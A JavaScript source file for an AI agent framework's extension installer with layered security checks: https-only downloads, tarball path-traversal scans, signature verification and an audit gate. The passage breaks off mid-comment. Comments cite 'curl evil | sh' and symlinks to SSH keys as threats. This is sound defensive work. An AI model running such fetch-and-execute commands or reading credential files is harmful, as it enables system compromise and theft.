/**
 * extension-installer.js
 *
 * IJFW v1.4.0 / t10 — Extension installer with Trident install gate.
 *
 * Security model (v1.4.0):
 *   - SHA256 integrity hash detects tamper, NOT publisher identity.
 *   - Install-time static analysis: classify() per file + isSafeVerifyCommand()
 *     per shell command.
 *   - Trident audit at install is the trust mechanism.
 *   - Runtime sandbox mediation is DEFERRED TO v1.5.0. At runtime, extension
 *     skill bodies execute through normal agent tool surfaces with the same
 *     security posture as bundled IJFW skills.
 */

import {
  cp,
  lstat,
  mkdir,
  mkdtemp,
  readFile,
  readdir,
  rename,
  rm,
  stat,
  writeFile,
} from 'node:fs/promises';
import { createWriteStream } from 'node:fs';
import { homedir, tmpdir } from 'node:os';
import { dirname, isAbsolute, join, resolve, sep } from 'node:path';
import { randomBytes } from 'node:crypto';
import { spawn } from 'node:child_process';
import { get as httpsGet } from 'node:https';
import { pipeline } from 'node:stream/promises';

import {
  validateExtensionManifest,
} from './extension-manifest-schema.js';
import {
  verifyIntegrity,
  scanExtensionForSecrets,
  scanInlineCommands,
  validatePermissions,
  verifyManifestSignature,
  readTrustedPublishers,
} from './extension-signer.js';
import { runTrident } from './trident/dispatch.js';
import { emitGateResult } from './gate-result.js';
import {
  deployExtensionToAgentsMd,
  deployExtensionSkillsToPlatforms,
  removeExtensionFromAgentsMd,
  uninstallExtensionSkillsFromPlatforms,
} from '../../installer/src/install-helpers.js';

// --- constants -------------------------------------------------------------

const GIT_CLONE_TIMEOUT_MS = 30_000;
const HTTPS_REQUEST_TIMEOUT_MS = 30_000;
const REGISTRY_FILENAME = 'extension-registry.json';

// Maximum 3xx redirects to follow before giving up. A malicious mirror or a
// misconfigured server can otherwise loop indefinitely; without a cap both
// fetchJsonHttps and downloadHttps recurse without bound. 5 is the common
// browser default and is comfortably above any legitimate registry redirect
// chain (registry.npmjs.org typically lands in 0–1 hops).
const MAX_HTTPS_REDIRECTS = 5;

// Matches the schema's accepted shape for manifest.name. Kept local because
// extension-manifest-schema.js does not export the pattern. Stays in sync
// manually — the schema and this constant are co-located.
const EXTENSION_NAME_PATTERN = /^(@[a-z0-9-]+\/)?[a-z][a-z0-9-]*$/;

// Verdicts considered acceptable for a normal install (3/3 lenses).
const ACCEPTABLE_VERDICTS = new Set(['PASS', 'CONDITIONAL']);

// --- helpers: source resolution -------------------------------------------

/**
 * Classify the install source.
 * @param {string} source
 * @returns {'npm'|'local'|'git'}
 */
function classifySource(source) {
  if (typeof source !== 'string' || source.length === 0) {
    throw new TypeError('installExtension: source must be a non-empty string');
  }
  if (/^https?:\/\//i.test(source) || /\.git$/i.test(source) ||
      /^git[:@]/i.test(source) || /^ssh:\/\//i.test(source)) {
    return 'git';
  }
  if (source.startsWith('./') || source.startsWith('../') ||
      source.startsWith('/') || source.startsWith('~') ||
      (isAbsolute(source))) {
    return 'local';
  }
  // npm package names: @scope/name or bare-name. Reject anything else above.
  return 'npm';
}

/**
 * Resolve a `~`-prefixed path to absolute.
 * @param {string} p
 * @returns {string}
 */
function expandHome(p) {
  if (typeof p !== 'string') return p;
  if (p === '~') return homedir();
  if (p.startsWith('~/') || p.startsWith('~\\')) {
    return join(homedir(), p.slice(2));
  }
  return p;
}

/**
 * Create a unique temp directory under os.tmpdir().
 * @returns {Promise<string>}
 */
async function makeTempDir() {
  return mkdtemp(join(tmpdir(), 'ijfw-ext-'));
}

// --- helpers: npm registry --------------------------------------------------

/**
 * Resolve a 3xx Location header against the request URL. Rejects (throws)
 * if the resulting URL is not https:// — protocol-downgrade-via-redirect is
 * a classic exfil vector. Returns the absolute https URL string.
 *
 * @param {string} requestUrl
 * @param {string} location
 * @returns {string}
 */
function resolveHttpsRedirect(requestUrl, location) {
  const next = new URL(location, requestUrl);
  if (next.protocol !== 'https:') {
    throw new Error(`redirect to non-https url refused: ${next.protocol}//${next.host}`);
  }
  return next.toString();
}

/**
 * Fetch JSON from https with timeout. Follows up to MAX_HTTPS_REDIRECTS
 * 3xx redirects (default 5); rejects on cycles, exceeding the cap, or any
 * cross-protocol redirect (https only).
 *
 * @param {string} url
 * @param {number} [redirectsRemaining]
 * @returns {Promise<any>}
 */
function fetchJsonHttps(url, redirectsRemaining = MAX_HTTPS_REDIRECTS) {
  return new Promise((resolveP, rejectP) => {
    const req = httpsGet(url, { headers: { 'accept': 'application/json' } }, (res) => {
      if (res.statusCode && (res.statusCode >= 300 && res.statusCode < 400) && res.headers.location) {
        res.resume();
        if (redirectsRemaining <= 0) {
          rejectP(new Error(`too many redirects (>${MAX_HTTPS_REDIRECTS}) following ${url}`));
          return;
        }
        let nextUrl;
        try {
          nextUrl = resolveHttpsRedirect(url, res.headers.location);
        } catch (err) {
          rejectP(err);
          return;
        }
        fetchJsonHttps(nextUrl, redirectsRemaining - 1).then(resolveP, rejectP);
        return;
      }
      if (!res.statusCode || res.statusCode < 200 || res.statusCode >= 300) {
        res.resume();
        rejectP(new Error(`https GET ${url} returned status ${res.statusCode}`));
        return;
      }
      const chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => {
        try {
          const body = Buffer.concat(chunks).toString('utf8');
          resolveP(JSON.parse(body));
        } catch (err) {
          rejectP(err);
        }
      });
      res.on('error', rejectP);
    });
    req.setTimeout(HTTPS_REQUEST_TIMEOUT_MS, () => {
      req.destroy(new Error(`https GET ${url} timeout after ${HTTPS_REQUEST_TIMEOUT_MS}ms`));
    });
    req.on('error', rejectP);
  });
}

/**
 * Download a binary file from https to a local path, with timeout + redirects.
 * Follows up to MAX_HTTPS_REDIRECTS 3xx redirects (default 5); rejects on
 * cycles, exceeding the cap, or any cross-protocol redirect (https only).
 *
 * @param {string} url
 * @param {string} destPath
 * @param {number} [redirectsRemaining]
 * @returns {Promise<void>}
 */
function downloadHttps(url, destPath, redirectsRemaining = MAX_HTTPS_REDIRECTS) {
  return new Promise((resolveP, rejectP) => {
    const req = httpsGet(url, (res) => {
      if (res.statusCode && (res.statusCode >= 300 && res.statusCode < 400) && res.headers.location) {
        res.resume();
        if (redirectsRemaining <= 0) {
          rejectP(new Error(`too many redirects (>${MAX_HTTPS_REDIRECTS}) downloading ${url}`));
          return;
        }
        let nextUrl;
        try {
          nextUrl = resolveHttpsRedirect(url, res.headers.location);
        } catch (err) {
          rejectP(err);
          return;
        }
        downloadHttps(nextUrl, destPath, redirectsRemaining - 1).then(resolveP, rejectP);
        return;
      }
      if (!res.statusCode || res.statusCode < 200 || res.statusCode >= 300) {
        res.resume();
        rejectP(new Error(`download ${url} returned status ${res.statusCode}`));
        return;
      }
      const out = createWriteStream(destPath);
      pipeline(res, out).then(resolveP, rejectP);
    });
    req.setTimeout(HTTPS_REQUEST_TIMEOUT_MS, () => {
      req.destroy(new Error(`download ${url} timeout after ${HTTPS_REQUEST_TIMEOUT_MS}ms`));
    });
    req.on('error', rejectP);
  });
}

/**
 * Encode an npm package name for the registry URL (keeps `@` and `/`).
 * @param {string} name
 * @returns {string}
 */
function encodeNpmName(name) {
  // The npm registry accepts `@scope%2Fname` for scoped packages.
  if (name.startsWith('@')) {
    const slash = name.indexOf('/');
    if (slash > 0) {
      const scope = name.slice(0, slash);
      const pkg = name.slice(slash + 1);
      return `${encodeURIComponent(scope)}%2F${encodeURIComponent(pkg)}`;
    }
  }
  return encodeURIComponent(name);
}

/**
 * Spawn a child process with arg-list (NEVER shell-interpolated) and a timeout.
 * Returns once the process exits or the timeout fires.
 * @param {string} cmd
 * @param {string[]} args
 * @param {{cwd?: string, timeoutMs?: number, captureStdout?: boolean}} [opts]
 * @returns {Promise<{stdout: string}>}
 */
function spawnChecked(cmd, args, opts = {}) {
  return new Promise((resolveP, rejectP) => {
    const child = spawn(cmd, args, {
      cwd: opts.cwd,
      stdio: ['ignore', 'pipe', 'pipe'],
      shell: false,
    });
    let stderr = '';
    let stdout = '';
    child.stderr?.on('data', (b) => { stderr += b.toString('utf8'); });
    child.stdout?.on('data', (b) => {
      if (opts.captureStdout) stdout += b.toString('utf8');
      // else drain only
    });
    let timedOut = false;
    const timeoutMs = opts.timeoutMs ?? GIT_CLONE_TIMEOUT_MS;
    const timer = setTimeout(() => {
      timedOut = true;
      child.kill('SIGKILL');
    }, timeoutMs);
    child.on('error', (err) => {
      clearTimeout(timer);
      rejectP(err);
    });
    child.on('close', (code) => {
      clearTimeout(timer);
      if (timedOut) {
        rejectP(new Error(`${cmd} ${args.join(' ')} timed out after ${timeoutMs}ms`));
        return;
      }
      if (code !== 0) {
        rejectP(new Error(`${cmd} exited with code ${code}: ${stderr.trim().slice(0, 500)}`));
        return;
      }
      resolveP({ stdout });
    });
  });
}

/**
 * Pre-scan a tarball for tar-slip / symlink / hardlink members before
 * extraction. Approach 1 from the audit spec: list contents with
 * `tar -tvzf`, reject any member that
 *   - starts with `/` (absolute path)
 *   - contains a `..` segment (escapes extract dir on join)
 *   - is a symlink or hardlink (mode char `l` or `h` in the verbose listing)
 *
 * `tar -tvzf` output format starts with the file-mode field whose first
 * char encodes the type: `-` file, `d` dir, `l` symlink, `h` hardlink.
 * Filenames appear last on the line, with symlinks/hardlinks following the
 * pattern `<name> -> <target>`.
 *
 * @param {string} tarballPath
 * @returns {Promise<void>} resolves if clean, throws with reason if not
 */
async function preflightTarball(tarballPath) {
  const { stdout } = await spawnChecked('tar', ['-tvzf', tarballPath], {
    timeoutMs: GIT_CLONE_TIMEOUT_MS,
    captureStdout: true,
  });
  // Independent name listing — `tar -tzf` prints one member name per line with
  // no leading metadata. Used for path-traversal / absolute-path checks where
  // robust field parsing across BSD vs GNU tar is otherwise brittle.
  const { stdout: namesOut } = await spawnChecked('tar', ['-tzf', tarballPath], {
    timeoutMs: GIT_CLONE_TIMEOUT_MS,
    captureStdout: true,
  });
  const names = namesOut.split('\n').filter((l) => l.length > 0);
  for (const name of names) {
    if (name.startsWith('/')) {
      throw new Error(`tar-slip: tarball contains absolute path member: ${name}`);
    }
    const segments = name.split(/[\\/]/);
    if (segments.includes('..')) {
      throw new Error(`tar-slip: tarball contains '..' segment in member: ${name}`);
    }
  }
  // Verbose listing — used solely for type-char (symlink/hardlink) detection.
  // The first character of the first whitespace-delimited field encodes type:
  // `-` file, `d` dir, `l` symlink, `h` hardlink. Works the same on BSD + GNU.
  const lines = stdout.split('\n').filter((l) => l.length > 0);
  for (const line of lines) {
    const modeMatch = line.match(/^(\S+)/);
    if (!modeMatch) continue;
    const typeChar = modeMatch[1][0];
    if (typeChar === 'l' || typeChar === 'h') {
      throw new Error(`tar-slip: tarball contains symlink/hardlink (refused): ${line.slice(0, 200)}`);
    }
  }
}

/**
 * Fetch + extract an npm tarball into a fresh temp dir.
 * @param {string} pkgName
 * @returns {Promise<{dir: string, cleanup: () => Promise<void>}>}
 */
async function fetchNpmExtension(pkgName) {
  const encoded = encodeNpmName(pkgName);
  const meta = await fetchJsonHttps(`https://registry.npmjs.org/${encoded}`);
  const latestTag = meta['dist-tags']?.latest;
  if (!latestTag || !meta.versions || !meta.versions[latestTag]) {
    throw new Error(`npm package ${pkgName}: no latest version in registry metadata`);
  }
  const tarballUrl = meta.versions[latestTag].dist?.tarball;
  if (!tarballUrl || !/^https:\/\//i.test(tarballUrl)) {
    throw new Error(`npm package ${pkgName}: tarball url missing or not https`);
  }
  const tmp = await makeTempDir();
  const tarballPath = join(tmp, 'pkg.tgz');
  try {
    await downloadHttps(tarballUrl, tarballPath);
    const extractDir = join(tmp, 'extract');
    await mkdir(extractDir, { recursive: true });
    // R10/S10: pre-scan the tarball for tar-slip + symlink/hardlink members
    // BEFORE extraction. A malicious npm tarball could otherwise drop files
    // outside `extractDir` (absolute paths, `..` segments) or smuggle in a
    // symlink that downstream readFile() would follow to /etc/passwd.
    await preflightTarball(tarballPath);
    // `tar` accepts the tarball path via args — no shell interpolation.
    await spawnChecked('tar', ['-xzf', tarballPath, '-C', extractDir], {
      timeoutMs: GIT_CLONE_TIMEOUT_MS,
    });
    // npm tarballs always extract into a single top-level "package/" dir.
    const entries = await readdir(extractDir, { withFileTypes: true });
    const top = entries.find((e) => e.isDirectory());
    if (!top) {
      throw new Error(`npm package ${pkgName}: extracted tarball has no top-level dir`);
    }
    const dir = join(extractDir, top.name);
    return {
      dir,
      cleanup: async () => { await rm(tmp, { recursive: true, force: true }); },
    };
  } catch (err) {
    await rm(tmp, { recursive: true, force: true }).catch(() => {});
    throw err;
  }
}

/**
 * Clone an https git URL shallowly into a fresh temp dir. Rejects non-https.
 * @param {string} url
 * @returns {Promise<{dir: string, cleanup: () => Promise<void>}>}
 */
async function fetchGitExtension(url) {
  // R10: only https:// allowed. Explicitly reject other schemes here.
  if (!/^https:\/\//i.test(url)) {
    throw new Error(`git clone source must use https:// scheme (got ${url.split(':')[0]}://)`);
  }
  // Sanity: disallow URLs that smuggle a remote helper protocol.
  if (/git:\/\/|ssh:\/\/|file:\/\//i.test(url)) {
    throw new Error(`git clone source must use https:// scheme (rejected ${url})`);
  }
  const tmp = await makeTempDir();
  const cloneDir = join(tmp, 'repo');
  try {
    await spawnChecked('git', ['clone', '--depth', '1', url, cloneDir], {
      timeoutMs: GIT_CLONE_TIMEOUT_MS,
    });
    return {
      dir: cloneDir,
      cleanup: async () => { await rm(tmp, { recursive: true, force: true }); },
    };
  } catch (err) {
    await rm(tmp, { recursive: true, force: true }).catch(() => {});
    throw err;
  }
}

/**
 * Resolve a local path source (no copying — read in place).
 * @param {string} path
 * @returns {Promise<{dir: string, cleanup: () => Promise<void>}>}
 */
async function fetchLocalExtension(path) {
  const expanded = expandHome(path);
  const abs = resolve(expanded);
  const st = await stat(abs).catch(() => null);
  if (!st || !st.isDirectory()) {
    throw new Error(`local extension source not found or not a directory: ${abs}`);
  }
  return { dir: abs, cleanup: async () => { /* nothing to clean */ } };
}

// --- helpers: manifest + skill bodies --------------------------------------

/**
 * Read + parse the manifest.json from an extension dir.
 * @param {string} extensionDir
 * @returns {Promise<object>}
 */
async function readManifest(extensionDir) {
  const path = join(extensionDir, 'manifest.json');
  const raw = await readFile(path, 'utf8').catch(() => {
    throw new Error(`manifest.json not found at ${path}`);
  });
  try {
    return JSON.parse(raw);
  } catch (err) {
    throw new Error(`manifest.json is not valid JSON: ${err.message}`);
  }
}

/**
 * Read every declared skill body. Returns {name, file, body, absPath}[].
 * Rejects symlinks and any path that resolves outside `extensionDir`.
 *
 * @param {object} manifest
 * @param {string} extensionDir
 * @returns {Promise<Array<{name: string, file: string, body: string, absPath: string}>>}
 */
async function readSkillBodies(manifest, extensionDir) {
  const skills = Array.isArray(manifest.skills) ? manifest.skills : [];
  const out = [];
  const extensionRoot = resolve(extensionDir);
  for (const s of skills) {
    if (!s || typeof s.file !== 'string') continue;
    // Guard against path traversal — the schema's FILE_PATH_PATTERN already
    // restricts to safe chars + .md, but reject `..` segments belt-and-braces.
    if (s.file.split(/[\\/]/).some((seg) => seg === '..')) {
      throw new Error(`skill file path contains traversal segment: ${s.file}`);
    }
    const absPath = join(extensionDir, s.file);
    // S11: lstat first so we detect symlinks BEFORE readFile() follows them.
    // A malicious extension could declare a `.md` skill that's actually a
    // symlink to /etc/passwd or ~/.ssh/id_rsa — readFile would silently
    // follow the link and pipe local secrets into the audit brief.
    const lst = await lstat(absPath).catch(() => null);
    if (!lst) {
      throw new Error(`skill file not readable: ${s.file}`);
    }
    if (lst.isSymbolicLink()) {
      throw new Error(`skill file is a symlink (refused): ${s.file}`);
    }
    // Belt-and-braces: after resolve(), verify the canonical path still lives
    // inside extensionRoot. Catches symlink-free traversal we missed above.
    const resolvedAbs = resolve(absPath);
    if (resolvedAbs !== extensionRoot &&
        !resolvedAbs.startsWith(extensionRoot + sep)) {
      throw new Error(`skill file resolves outside extension dir: ${s.file}`);
    }
    const body = await readFile(absPath, 'utf8').catch(() => {
      throw new Error(`skill file not readable: ${s.file}`);
    });
    out.push({ name: s.name, file: s.file, body, absPath });
  }
  return out;
}

// --- helpers: scope resolution ---------------------------------------------

/**
 * Resolve the on-disk scope directory for a given scope + extension name.
 * @param {{scope: 'project'|'org'|'user', projectRoot: string}} opts
 * @param {string} name
 * @returns {string}
 */
function resolveScopeDir(opts, name) {
  const home = homedir();
  switch (opts.scope) {
    case 'project':
      if (!opts.projectRoot) {
        throw new Error('project scope requires opts.projectRoot');
      }
      return join(opts.projectRoot, '.ijfw', 'extensions', name);
    case 'org':
      return join(home, '.ijfw', 'extensions-org', name);
    case 'user':
      return join(home, '.ijfw', 'extensions-user', name);
    default:
      throw new Error(`unknown scope: ${opts.scope}`);
  }
}

/**
 * Resolve the registry file path for a given scope.
 * @param {{scope: 'project'|'org'|'user', projectRoot: string}} opts
 * @returns {string}
 */
function resolveRegistryPath(opts) {
  const home = homedir();
  switch (opts.scope) {
    case 'project':
      if (!opts.projectRoot) {
        throw new Error('project scope requires opts.projectRoot');
      }
      return join(opts.projectRoot, '.ijfw', 'state', REGISTRY_FILENAME);
    case 'org':
      return join(home, '.ijfw', 'state-org', REGISTRY_FILENAME);
    case 'user':
      return join(home, '.ijfw', 'state-user', REGISTRY_FILENAME);
    default:
      throw new Error(`unknown scope: ${opts.scope}`);
  }
}

/**
 * All registry locations searched by listExtensions().
 * @param {string} projectRoot
 * @returns {Array<{scope: string, path: string}>}
 */
function allRegistryPaths(projectRoot) {
  const home = homedir();
  const list = [];
  if (projectRoot) {
    list.push({ scope: 'project', path: join(projectRoot, '.ijfw', 'state', REGISTRY_FILENAME) });
  }
  list.push({ scope: 'org', path: join(home, '.ijfw', 'state-org', REGISTRY_FILENAME) });
  list.push({ scope: 'user', path: join(home, '.ijfw', 'state-user', REGISTRY_FILENAME) });
  return list;
}

async function readRegistry(path) {
  try {
    const raw = await readFile(path, 'utf8');
    const parsed = JSON.parse(raw);
    if (parsed && Array.isArray(parsed.extensions)) return parsed;
    return { extensions: [] };
  } catch {
    return { extensions: [] };
  }
}

async function writeRegistry(path, registry) {
  await mkdir(dirname(path), { recursive: true });
  // Atomic write: tmp + rename. Use pid + 4-byte random suffix so concurrent
  // writes (same pid, parallel async calls, or two installer processes) cannot
  // collide on a single tmp filename and clobber each other's in-flight state.
  const tmp = `${path}.tmp.${process.pid}.${randomBytes(4).toString('hex')}`;
  const body = JSON.stringify(registry, null, 2) + '\n';
  try {
    await writeFile(tmp, body, 'utf8');
    await rename(tmp, path);
  } catch (err) {
    // Best-effort cleanup of the tmp file if rename failed mid-flight.
    try { await rm(tmp, { force: true }); } catch { /* swallow */ }
    throw err;
  }
}

// --- exported helpers -------------------------------------------------------

// Per-skill audit-brief budget. 20 KiB comfortably accommodates the long tail
// of real-world skill bodies (typical < 5 KiB) while preventing the brief from
// ballooning if a skill ships a multi-megabyte body. When a body exceeds the
// cap, we keep the first 18 KiB AND the last 1.5 KiB with a truncation marker
// so adversarial payloads tucked at the bottom (e.g. `curl evil | sh` after
// 19 KiB of innocuous prose) still surface to Trident.
const AUDIT_BRIEF_SKILL_BUDGET = 20_000;
const AUDIT_BRIEF_HEAD_BYTES = 18_000;
const AUDIT_BRIEF_TAIL_BYTES = 1_500;

/**
 * Build the per-skill body excerpt for the audit brief. Bodies under the
 * budget pass through unchanged. Bodies over the budget are head+tail
 * truncated with an explicit `... [truncated N chars] ...` marker so the
 * audit lens (and any human reviewer) can see what was dropped.
 *
 * @param {string} body
 * @returns {string}
 */
function buildAuditBriefExcerpt(body) {
  if (typeof body !== 'string' || body.length === 0) return '';
  if (body.length <= AUDIT_BRIEF_SKILL_BUDGET) return body;
  const head = body.slice(0, AUDIT_BRIEF_HEAD_BYTES);
  const tail = body.slice(body.length - AUDIT_BRIEF_TAIL_BYTES);
  const dropped = body.length - AUDIT_BRIEF_HEAD_BYTES - AUDIT_BRIEF_TAIL_BYTES;
  return `${head}\n... [truncated ${dropped} chars] ...\n${tail}`;
}

/**
 * Build the markdown brief passed to the Trident audit. Exported so tests can
 * assert on payload shape.
 *
 * @param {object} manifest
 * @param {Array<{name: string, file: string, body: string}>} skillBodies
 * @returns {string}
 */
export function extensionAuditBrief(manifest, skillBodies) {
  const m = manifest || {};
  const skills = Array.isArray(skillBodies) ? skillBodies : [];
  const lines = [];
  lines.push('# Extension Install Audit Brief');
  lines.push('');
  lines.push('## Manifest');
  lines.push(`- name: ${m.name ?? '(unknown)'}`);
  lines.push(`- version: ${m.version ?? '(unknown)'}`);
  lines.push(`- type: ${m.type ?? '(unknown)'}`);
  if (m.author) lines.push(`- author: ${m.author}`);
  if (m.license) lines.push(`- license: ${m.license}`);
  if (m.description) lines.push(`- description: ${m.description}`);
  lines.push(`- integrity: ${m.integrity ?? '(none)'}`);
  if (m.ijfw_requires) lines.push(`- ijfw_requires: ${m.ijfw_requires}`);

  const reads = m.permissions?.reads ?? [];
  const writes = m.permissions?.writes ?? [];
  lines.push('');
  lines.push('## Declared Permissions');
  lines.push(`- reads: ${reads.length ? reads.join(', ') : '(none)'}`);
  lines.push(`- writes: ${writes.length ? writes.join(', ') : '(none)'}`);

  if (Array.isArray(m.overrides) && m.overrides.length) {
    lines.push('');
    lines.push('## Overrides');
    for (const o of m.overrides) {
      lines.push(`- ${o.skill ?? '(unknown)'} -> ${o.file ?? '(unknown)'}`);
    }
  }

  lines.push('');
  lines.push(`## Skills (${skills.length})`);
  for (const s of skills) {
    lines.push('');
    lines.push(`### ${s.name} (${s.file})`);
    const excerpt = buildAuditBriefExcerpt(typeof s.body === 'string' ? s.body : '');
    lines.push('```');
    lines.push(excerpt);
    lines.push('```');
  }
  return lines.join('\n');
}

// --- install ----------------------------------------------------------------

/**
 * Install an extension from npm, local path, or https git URL.
 *
 * @param {string} source
 * @param {{
 *   scope: 'project'|'org'|'user',
 *   projectRoot: string,
 *   force?: boolean,
 *   accept_degraded_trident?: boolean,
 *   tridentExecutor?: Function,  // test seam — forwarded as runTrident({executor})
 * }} opts
 * @returns {Promise<{ok: boolean, name?: string, version?: string, scope?: string, gate_result_block?: string, errors?: string[]}>}
 */
export async function installExtension(source, opts = {}) {
  if (!opts || typeof opts !== 'object') {
    return { ok: false, errors: ['installExtension: opts is required'] };
  }
  if (opts.scope !== 'project' && opts.scope !== 'org' && opts.scope !== 'user') {
    return { ok: false, errors: ['installExtension: opts.scope must be project|org|user'] };
  }
  if (opts.scope === 'project' && (!opts.projectRoot || typeof opts.projectRoot !== 'string')) {
    return { ok: false, errors: ['installExtension: project scope requires opts.projectRoot'] };
  }

  let fetched = null;
  let gateResultBlock;

  try {
    // 1. Resolve & fetch.
    const kind = classifySource(source);
    if (kind === 'npm') fetched = await fetchNpmExtension(source);
    else if (kind === 'local') fetched = await fetchLocalExtension(source);
    else if (kind === 'git') fetched = await fetchGitExtension(source);
    else {
      return { ok: false, errors: [`unknown source kind: ${kind}`] };
    }

    const extensionDir = fetched.dir;

    // 2. Read + validate manifest.
    const manifest = await readManifest(extensionDir);
    const schemaResult = validateExtensionManifest(manifest);
    if (!schemaResult.valid) {
      return { ok: false, errors: schemaResult.errors.map((e) => `manifest: ${e}`) };
    }

    // 3. Verify integrity hash.
    const integrity = verifyIntegrity(manifest);
    if (!integrity.valid) {
      return {
        ok: false,
        errors: [
          `integrity: hash verification failed (expected ${integrity.expected ?? '(none)'}, got ${integrity.got ?? '(none)'})`,
        ],
      };
    }

    // 3b. W7/B1: signature verification. Unsigned manifests are allowed only
    // when opts.allowUnsigned is set. Signed manifests must verify against a
    // trusted publisher unless opts.acceptUntrusted overrides.
    if (manifest.signature) {
      const trustedKeys = await readTrustedPublishers();
      const sigCheck = verifyManifestSignature(manifest, trustedKeys);
      if (!sigCheck.valid) {
        if (!opts.acceptUntrusted) {
          const kidHint = sigCheck.publisherKeyId
            ? ` (publisher_key_id: ${sigCheck.publisherKeyId} — trust with "ijfw extension trust <keyId> <publicKey>" if you know this publisher)`
            : '';
          return {
            ok: false,
            errors: [`signature: verify failed: ${sigCheck.reason}${kidHint}`],
          };
        }
        process.stderr.write(
          `[ijfw] extension-installer: signature unverified for ${manifest.name}: ${sigCheck.reason}\n`,
        );
      }
    } else if (!opts.allowUnsigned) {
      return {
        ok: false,
        errors: ['signature: unsigned extension; pass --allow-unsigned to install anyway'],
      };
    }

    // 4. Permissions allowlist check.
    const permResult = validatePermissions(manifest);
    if (!permResult.valid) {
      return { ok: false, errors: permResult.errors.map((e) => `permissions: ${e}`) };
    }

    // 5. Static analysis: secrets scan + inline-command scan.
    const secretsResult = await scanExtensionForSecrets(extensionDir);
    if (!secretsResult.clean) {
      const findingsLines = secretsResult.findings
        .slice(0, 20)
        .map((f) => `secrets: ${f.file}:${f.line} kind=${f.kind}`);
      return { ok: false, errors: findingsLines };
    }

    const skillBodies = await readSkillBodies(manifest, extensionDir);
    const cmdFindings = [];
    for (const sb of skillBodies) {
      const r = scanInlineCommands(sb.body);
      if (!r.clean) {
        for (const f of r.findings) {
          cmdFindings.push(`unsafe-command in ${sb.file}: ${f.command} (${f.reason})`);
        }
      }
    }
    if (cmdFindings.length > 0) {
      return { ok: false, errors: cmdFindings };
    }

    // 6. Trident install gate.
    const brief = extensionAuditBrief(manifest, skillBodies);
    const tridentOpts = {
      brief,
      gate: 'extension-install',
      accept_degraded: !!opts.accept_degraded_trident,
      projectRoot: opts.projectRoot,
    };
    if (typeof opts.tridentExecutor === 'function') {
      tridentOpts.executor = opts.tridentExecutor;
    }

    let tridentResult;
    try {
      tridentResult = await runTrident(tridentOpts);
    } catch (err) {
      // DegradedTridentError or any other failure aborts the install.
      gateResultBlock = await emitGateResult(
        {
          gate: 'extension-install',
          status: 'FAIL',
          lenses: [],
          affected_artifacts: [
            { type: 'file', ref: 'manifest.json', role: 'extension-manifest' },
          ],
          accounting: { duration_ms: 0, lenses_invoked: 0, cost_usd: null },
          remediation: [
            {
              action: 'Trident audit could not run (degraded or offline).',
              target: manifest.name || 'extension',
              agent_recommended: 'human-review',
              confidence: 0.5,
            },
          ],
        },
        { projectRoot: opts.projectRoot },
      ).catch(() => undefined);
      return {
        ok: false,
        errors: [`trident: ${err && err.message ? err.message : String(err)}`],
        gate_result_block: gateResultBlock,
      };
    }

    // R6 degraded behavior:
    //   3/3 -> PASS or CONDITIONAL required
    //   2/3 -> CONDITIONAL blocking unless accept_degraded_trident
    //   1/3 -> install rejected unless accept_degraded_trident
    //   0/3 -> impossible here (runTrident throws first)
    const verdict = tridentResult.verdict;
    const mode = tridentResult.mode;
    let acceptable = false;
    if (mode === 'full') {
      acceptable = ACCEPTABLE_VERDICTS.has(verdict);
    } else if (mode === 'partial') {
      acceptable = opts.accept_degraded_trident && ACCEPTABLE_VERDICTS.has(verdict);
    } else if (mode === 'single-lens-accepted') {
      acceptable = opts.accept_degraded_trident && ACCEPTABLE_VERDICTS.has(verdict);
    } else {
      // single-lens-degraded / offline / anything else: not acceptable
      acceptable = false;
    }

    const lensesForGate = (tridentResult.lens_results || []).map((lr) => {
      const rawVerdict = String(lr.verdict || '').toUpperCase();
      const knownVerdict = ACCEPTABLE_VERDICTS.has(rawVerdict) ||
        ['WARN', 'FLAG', 'FAIL'].includes(rawVerdict);
      const findings = Array.isArray(lr.findings) ? lr.findings : [];
      const summary = findings.length
        ? findings.slice(0, 3).map((f) => (typeof f === 'string' ? f : (f?.message || JSON.stringify(f)))).join('; ')
        : (lr.note || '(no findings)');
      return {
        model: String(lr.lens || 'unknown'),
        verdict: knownVerdict ? rawVerdict : 'WARN',
        confidence: typeof lr.confidence === 'number' && lr.confidence >= 0 && lr.confidence <= 1
          ? lr.confidence
          : 0.5,
        summary: String(summary).slice(0, 500),
      };
    });

    gateResultBlock = await emitGateResult(
      {
        gate: 'extension-install',
        status: verdict,
        lenses: lensesForGate,
        affected_artifacts: [
          { type: 'file', ref: 'manifest.json', role: 'extension-manifest' },
        ],
        accounting: {
          duration_ms: 0,
          lenses_invoked: tridentResult.lens_results?.length ?? 0,
          cost_usd: null,
        },
        remediation: acceptable
          ? []
          : [
              {
                action: `Trident verdict ${verdict} in mode ${mode}; install blocked. ` +
                  `Pass accept_degraded_trident:true after human review to override.`,
                target: manifest.name || 'extension',
                agent_recommended: 'human-review',
                confidence: 0.5,
              },
            ],
      },
      { projectRoot: opts.projectRoot },
    ).catch(() => undefined);

    if (!acceptable) {
      return {
        ok: false,
        errors: [
          `trident: verdict ${verdict} in mode ${mode} blocks install`,
        ],
        gate_result_block: gateResultBlock,
      };
    }

    // 7. Copy skill files into scope dir.
    if (manifest.type !== 'skill-only') {
      return {
        ok: false,
        errors: [`manifest.type ${manifest.type} not supported in v1.4.0`],
        gate_result_block: gateResultBlock,
      };
    }

    const scopeDir = resolveScopeDir(opts, manifest.name);

    // 7a. Atomic install: stage into a sibling tmp dir, then rename into place.
    // Sequence guarantees that we NEVER leave a registered-but-incomplete
    // extension on disk. A crash during copy leaves either (a) the previous
    // scopeDir intact, or (b) an orphan tmpScopeDir which is cleanable on
    // retry. Registry writes happen only after the rename succeeds.
    const tmpScopeDir = `${scopeDir}.tmp.${process.pid}.${randomBytes(4).toString('hex')}`;
    try {
      // Best-effort clean of any stale tmp from a prior crashed install.
      await rm(tmpScopeDir, { recursive: true, force: true });
      await mkdir(tmpScopeDir, { recursive: true });

      // Always carry the manifest itself.
      await writeFile(
        join(tmpScopeDir, 'manifest.json'),
        JSON.stringify(manifest, null, 2) + '\n',
        'utf8',
      );

      // Copy skill files preserving relative layout.
      const skillsRoot = join(tmpScopeDir, 'skills');
      await mkdir(skillsRoot, { recursive: true });
      for (const s of skillBodies) {
        const dst = join(skillsRoot, s.file);
        await mkdir(dirname(dst), { recursive: true });
        await cp(s.absPath, dst, { force: true });
      }

      // Atomic flip: drop old scopeDir, rename tmp -> scope. fs.rename is
      // atomic on POSIX when source/dest are on the same filesystem (they are
      // — same parent directory). On Windows rename to existing dir fails, so
